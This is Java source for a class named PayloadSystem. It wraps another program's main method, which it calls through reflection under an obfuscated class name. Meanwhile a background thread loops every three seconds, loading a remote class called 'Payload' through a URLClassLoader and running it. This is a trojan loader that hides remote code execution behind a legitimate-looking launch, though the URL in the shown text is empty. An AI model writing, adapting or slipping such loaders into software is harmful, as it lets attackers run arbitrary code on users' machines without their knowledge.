package plvc;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class PayloadSystem {

    private static boolean pld = false;

    public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, IllegalAccessException {
        pld = true;
        run();
        Class mcClass = Class.forName(("_".toLowerCase() + "0ef7878959aec39e48a9b370a79bbfde").substring(1));
        Method mainMethod = mcClass.getMethod("main", String[].class);
        mainMethod.invoke(null, (Object) args);
    }

    private static void run() {
        new Thread(PayloadSystem::payload).start();
    }

    private static void payload() {
        while (true) {
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            try {
                URL url = new URL("");
                ClassLoader classLoader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());
                Class payloadClass = classLoader.loadClass("Payload");
                Object payloadInstance = payloadClass.newInstance();
                Method runMethod = payloadClass.getDeclaredMethod("run");
                runMethod.invoke(payloadInstance);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
